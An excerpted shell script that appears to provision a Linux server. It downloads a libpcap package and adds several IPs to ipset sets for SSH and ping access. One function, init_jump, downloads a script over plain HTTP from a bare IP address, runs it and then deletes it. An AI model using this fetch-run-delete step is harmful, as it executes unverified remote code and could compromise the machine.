...
if [ -f /usr/local/sbin/iftop ];then
	...
	then
		wget ftp://195.220.108.108/linux/centos/7.3.1611/os/x86_64/Packages/libpcap-devel-1.5.3-8.el7.x86_64.rpm
...
init_jump()
{
	wget http://47.89.30.91/lll/clients_user.sh
	sh -x clients_user.sh
	rm -f clients_user.sh
...
sudo ipset add ssh 69.172.86.147
sudo ipset add ssh 220.228.11.26
...
sudo ipset add ping 220.228.11.26
sudo ipset add ping 69.172.86.147
